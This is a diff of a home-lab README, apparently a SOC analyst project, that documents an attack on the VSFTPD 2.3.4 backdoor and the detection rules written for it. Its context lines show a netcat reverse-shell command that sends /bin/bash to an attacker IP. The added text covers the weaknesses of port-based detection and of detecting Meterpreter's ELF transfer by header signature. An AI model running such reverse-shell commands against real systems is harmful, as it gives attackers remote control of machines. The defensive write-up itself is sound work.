@@ -171,7 +171,7 @@ Metasploit Framework was launched using ```msfconsole``` on the attacker. Using 
 Note that once the vulnerability was exploited and a bind shell was spawned, the attacker ran ```whoami``` and ```uname -a``` to confirm access to the victim (since no prompt was displayed). To set up a reverse shell, the following command was executed using a separate terminal session on the attacker:<br>
 ```nc -lvnp 17000 ```<br>
 
-This command listened for connections on port 17000. Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
+This command listened for connections on port 17000 (randomly selected user port). Thereafter, in the spawned shell, the following was executed to connect another shell session to the attacker:<br>
 ```nc -e /bin/bash 192.168.8.134 17000```<br>
 
 Below is the command used to listen for this reverse shell connection, the output showing successful connection and some commands to setup better utility of the reverse shell:
@@ -281,16 +281,17 @@ While this rule provides strong detection capabilities for this particular paylo
 
 ### Metasploit Reverse Shell - Leveraging the VSFTPD 2.3.4 vulnerability
 
-Similar to the previous exploit, this one is activated by a ":)" string following a username, however unlike the previous exploit, the bind shell (the default payload) is not a reverse shell. A reverse shell connection must be initiated by the victim to the attacker. Developing this rule was made possible through referring to the system's known services in use. Outgoing network connections initiated on port 17000 (randomly selected for this attack) was unusual as the port is associated with Kapersky proxy servers (according to [this source](https://www.speedguide.net/port.php?port=17000)) which should not be used on the defended network. [This source](https://www.youtube.com/watch?v=HAGrnDZhUto) mentions the port's occasional use by HikVision devices for streaming. Such devices are also not part of this network infrastructure, hence it was deemed appropriate to craft a rule directly monitoring this connection. The rule successfully detected the connection attempt and satisfied the challenge, however several limitations exist. 
+Unlike the previous exploit, the bind shell (the default payload in this exploit) is not a reverse shell. As such, a reverse shell connection must be initiated by the victim to the attacker. Developing this rule was justified through referring to the system's known services in use. [This source](https://www.youtube.com/watch?v=HAGrnDZhUto) mentions the port's occasional use by HikVision devices for streaming but such device are also not part of this network, hence it was deemed appropriate to craft a rule directly monitoring this port. The rule successfully detected the connection attempt and satisfied the challenge, however several limitations exist. 
 
-Detecting a reverse shell solely by monitoring port 17000 is ineffective, as attackers can easily change ports or use common ones like 443 or 80 to blend in with legitimate traffic. Reverse shells can be initiated using various tools, each with different communication patterns, making signature-based detection unreliable and prone to false negatives if the attack method varies. Instead of relying on fixed port monitoring, a better approach is to track uncommon outbound connections, such as a workstation establishing an interactive session with an unknown external IP. Additionally, detecting protocol anomalies, like an HTTP connection behaving like an interactive shell, can help identify suspicious behavior. Given the adaptability of reverse shells, a defense-in-depth strategy—including behavioral analysis, heuristic detection, and active SOC monitoring—provides a more robust and adaptive defense against these threats.
+Detecting a reverse shell solely by monitoring port 17000 is easily bypassed, as attackers can easily change ports or use common ones like 443 or 80 to blend in with legitimate traffic. Reverse shells can be initiated using various tools, each with different communication patterns, making signature-based detection unreliable and prone to false negatives if the attack method varies. Instead of relying on fixed port monitoring, a better approach is to track uncommon outbound connections, such as a workstation establishing an interactive session with an unknown external IP. Additionally, detecting protocol anomalies, like an HTTP connection behaving like an interactive shell, can help identify suspicious behavior. Given the adaptability of reverse shells, a defense-in-depth strategy—including behavioral analysis, heuristic detection, and active SOC monitoring—provides a more robust and adaptive defense against these threats.
 
 ### Metasploit Meterpreter Communication - Upgrading the VSFTPD 2.3.4 shell
 
+The ELF file header signature (0x7F454C46) in TCP traffic from the server to the client was critical in identifying this malicious file transfer. Below is a snippet of the packet:<br>
 
-## Lessons Learned & Improvements:
+<img src="https://github.com/Keamo-getswe/artefact-repo/blob/main/ELF-file-transfer.png">
 
-- Insights gained from the setup and attacks.
-- Possible enhancements:
-    - Executing more attack types for exposure to more attack vectors.
-    - Forwarding logs to a SIEM to exercise other SOC analyst skills.
+This rule successfully flags the transfer of this malicious ELF file, as the specific signature is unique to ELF files and is unlikely to occur in legitimate traffic unless the system is running software that specifically uses ELF files. However, there are several limitations. First, this rule looks for an exact match to the ELF header signature, making it vulnerable to evasion tactics such as payload obfuscation, where the attacker could encode or modify the payload to hide the ELF header. For example, an attacker might encode the ELF file in base64 or fragment packets to avoid detection by the rule. Additionally, the rule only inspects the first few bytes of the packet, which means attackers could manipulate the packet’s initial bytes to bypass detection, especially if the attack involves multi-stage payload delivery (this rule assumed that not to be the case). Finally, this rule may produce false positives if legitimate ELF files (e.g., software updates or legitimate application transfers) are transferred, especially in environments where Linux systems frequently use ELF files for legitimate purposes. To improve the rule, one could include further context, such as analyzing the behavior of the connection or the specific context in which the ELF file is being transferred, making it more adaptable and reducing false positives.
+
+## Conclusion:
+
